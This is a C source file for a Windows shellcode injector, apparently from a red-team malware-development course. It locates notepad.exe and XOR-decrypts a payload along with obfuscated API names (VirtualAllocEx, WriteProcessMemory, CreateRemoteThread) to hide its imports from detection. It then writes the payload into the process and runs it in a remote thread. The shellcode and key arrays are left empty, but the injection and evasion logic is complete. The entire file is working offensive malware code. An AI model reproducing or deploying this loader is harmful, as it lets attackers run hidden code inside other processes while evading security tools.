/*
@cocomelonc inspired by RTO malware development course
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// shellcode - 64-bit
unsigned char my_payload[] = { };

// encrypted functions
unsigned char s_vaex[] = { };
unsigned char s_cth[] = { };
unsigned char s_wfso[] = { };
unsigned char s_wpm[] = { };

// length
unsigned int my_payload_len = sizeof(my_payload);
unsigned int s_vaex_len = sizeof(s_vaex);
unsigned int s_cth_len = sizeof(s_cth);
unsigned int s_wfso_len = sizeof(s_wfso);
unsigned int s_wpm_len = sizeof(s_wpm);

char my_payload_key[] = "";
char f_key[] = "";

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    
    j = 0;
    for (int i = 0; i < data_len; i++) {
            if (j == key_len - 1) j = 0;

            data[i] = data[i] ^ key[j];
            j++;
    }
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
  
         // decrypt VirtualAllocEx function call
        XOR((char *) s_vaex, s_vaex_len, f_key, sizeof(f_key));
        pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vaex);
        pRemoteCode = pVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

        // decrypt WriteProcessMemory function call
        XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
        pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wpm);        
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        // decrypt CreateRemoteThread function call
        XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
        pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_cth);
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);

        if (hThread != NULL) {
                // decrypt WaitForSingleObject function call
                XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
                pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
                pWaitForSingleObject(hThread, 500);

                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
    int pid = 0;
    HANDLE hProc = NULL;

    pid = FindTarget("notepad.exe");

    if (pid) {
        printf("Notepad.exe PID = %d\n", pid);

        // try to open target process
        hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);

        if (hProc != NULL) {
            XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
            Inject(hProc, my_payload, my_payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
